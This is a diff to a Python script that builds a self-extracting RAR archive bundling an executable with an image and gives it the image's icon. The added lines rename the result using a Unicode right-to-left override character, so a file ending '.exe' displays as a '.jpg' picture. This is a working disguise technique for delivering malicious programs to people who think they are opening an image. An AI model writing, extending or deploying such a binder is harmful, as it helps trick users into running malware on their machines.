@@ -2,6 +2,7 @@ import sys
 import os
 import subprocess
 from wand.image import Image
+import random, string
 
 ICON = "temp.ico"
 CONFIG = "config.txt"
@@ -28,15 +29,18 @@ def create_archive(exe: str, img: str):
         f.write(contents.strip().replace(" ", ""))
 
     temp = "temp.exe"
+    out = "archive.exe"
 
     commands = [
         f"rar a -sfx -z{CONFIG} {temp} {exe} {img}",
         f'ResourceHacker.exe -open {temp} -save {temp} -action delete -res ICONGROUP,1,',
-        f'ResourceHacker.exe -open {temp} -save out.exe -action add -res temp.ico -mask ICONGROUP,1,'
+        f'ResourceHacker.exe -open {temp} -save {out} -action add -res temp.ico -mask ICONGROUP,1,'
     ]
 
     for command in commands:
-        subprocess.run(["cmd", "/c", command]) 
+        subprocess.run(["cmd", "/c", command])
+
+    os.rename(out, f"{''.join(random.choices(string.ascii_lowercase, k=6))}\u202Egpj.exe")
 
     os.remove(ICON)
     os.remove(CONFIG)
